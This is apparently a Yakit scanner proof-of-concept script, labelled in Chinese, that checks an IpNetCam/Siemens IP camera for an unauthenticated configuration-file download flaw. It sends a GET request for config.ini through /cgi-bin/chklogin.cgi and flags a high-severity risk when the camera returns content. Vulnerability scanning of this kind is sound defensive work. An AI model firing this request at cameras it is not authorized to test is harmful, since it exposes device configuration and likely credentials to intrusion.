script_name: siemens摄像头未授权下载配置文件漏洞检测
content:
##server:siemens摄像头
##type:poc
##params:root_url
##name:siemens_ipnetcam_config_unauth_download_poc
##severity:high
##out_put:siemens_ipnetcam_config_unauth_download_res


yakit.AutoInitYakit()
log.setLevel("info")


poc=func(addr){
    isTls = str.IsTLSServer(addr)
    packet=`GET /cgi-bin/chklogin.cgi?file=config.ini HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36`

    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))
    if err != nil {
        die(err)
    }    
    http_rsp, err = str.ParseBytesToHTTPResponse(rsp)
    if err != nil {
        die(err)
    }
    rsp_header,rsp_body=poc.Split(rsp)

    if http_rsp.StatusCode<400 && len(rsp_body)>0{
        risk.NewRisk(
            root_url,
            risk.severity("high"), 
            risk.title(f"FOUND ${root_url} 存在IpNetCam A107WIRF-HNH-03 IP摄像机版本0.376.223未授权下载配置文件漏洞"), 
            risk.titleVerbose("IpNetCam A107WIRF-HNH-03 IP摄像机版本0.376.223未授权下载配置文件漏洞"), 
            risk.type("身份伪造"), 
            risk.typeVerbose("配置错误"),                 
            risk.request(req), 
            risk.response(rsp), 
            risk.details({"siemens_ipnetcam_config_unauth_download_res":true}), 
        )        
    }
}


root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
